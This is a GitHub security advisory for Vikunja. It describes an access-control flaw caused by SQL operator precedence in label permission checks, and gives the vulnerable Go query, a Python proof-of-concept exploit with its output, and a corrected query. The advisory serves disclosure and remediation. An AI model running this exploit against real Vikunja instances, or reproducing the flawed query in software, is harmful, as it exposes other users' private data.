# [M] Vikunja has Broken Access Control on Label Read via SQL Operator Precedence Bug

## Summary
Severity: Medium
Advisory: GHSA-hj5c-mhh2-g7jq
CVE: CVE-2026-35596
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-hj5c-mhh2-g7jq
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The `hasAccessToLabel` function contains a SQL operator precedence bug that allows any authenticated user to read any label that has at least one task association, regardless of project access. Label titles, descriptions, colors, and creator information are exposed.

## Details

The access control query at `pkg/models/label_permissions.go:85-91` uses xorm's query chain in a way that produces SQL without proper grouping:

```go
has, err = s.Table("labels").
    Select("label_tasks.*").
    Join("LEFT", "label_tasks", "label_tasks.label_id = labels.id").
    Where("label_tasks.label_id is not null OR labels.created_by_id = ?", createdByID).
    Or(cond).
    And("labels.id = ?", l.ID).
    Exist(ll)
```

The xorm chain `.Where(A OR B).Or(C).And(D)` generates SQL: `WHERE A OR B OR C AND D`. Because SQL AND has higher precedence than OR, this evaluates as `WHERE A OR B OR (C AND D)`. The `labels.id = ?` constraint (D) only binds to the project access condition (C), while `label_tasks.label_id IS NOT NULL` (part of A) remains unconstrained.

Any label that has at least one task association passes the `IS NOT NULL` check, regardless of who is requesting it.

## Proof of Concept

Tested on Vikunja v2.2.2.

```python
import requests

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

def login(u, p):
    return requests.post(f"{API}/login", json={"username": u, "password": p}).json()["token"]

def h(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

a_token = login("labeler", "Labeler123!")
b_token = login("snooper", "Snooper123!")

# labeler creates private project, label, task, and assigns label
proj = requests.put(f"{API}/projects", headers=h(a_token),
                    json={"title": "Private Project"}).json()
label = requests.put(f"{API}/labels", headers=h(a_token),
                     json={"title": "CONFIDENTIAL-REVENUE", "hex_color": "ff0000"}).json()
task = requests.put(f"{API}/projects/{proj['id']}/tasks", headers=h(a_token),
                    json={"title": "Q4 revenue data"}).json()
requests.put(f"{API}/tasks/{task['id']}/labels", headers=h(a_token),
             json={"label_id": label["id"]})

# snooper reads the label from labeler's private project
r = requests.get(f"{API}/labels/{label['id']}", headers=h(b_token))
print(f"GET /labels/{label['id']}: {r.status_code}")  # 200 - should be 403
if r.status_code == 200:
    data = r.json()
    print(f"Title: {data['title']}")  # CONFIDENTIAL-REVENUE
    print(f"Creator: {data['created_by']['username']}")  # labeler
```

Output:
```
GET /labels/1: 200
Title: CONFIDENTIAL-REVENUE
Creator: labeler
```

Label IDs are sequential integers, making enumeration straightforward.

## Impact

Any authenticated user can read label metadata (titles, descriptions, colors) and creator user information from any project in the instance, provided the labels are attached to at least one task. This constitutes cross-project information disclosure. The creator's username and display name are also exposed.

## Recommended Fix

Use explicit `builder.And`/`builder.Or` grouping:

```go
has, err = s.Table("labels").
    Select("label_tasks.*").
    Join("LEFT", "label_tasks", "label_tasks.label_id = labels.id").
    Where(builder.And(
        builder.Eq{"labels.id": l.ID},
        builder.Or(
            builder.And(builder.Expr("label_tasks.label_id is not null"), cond),
            builder.Eq{"labels.created_by_id": createdByID},
        ),
    )).
    Exist(ll)
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-hj5c-mhh2-g7jq
- https://github.com/go-vikunja/vikunja/pull/2578
- https://github.com/go-vikunja/vikunja/commit/fc216c38afaa51dd56dde7a97343d2148ecf24c1
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
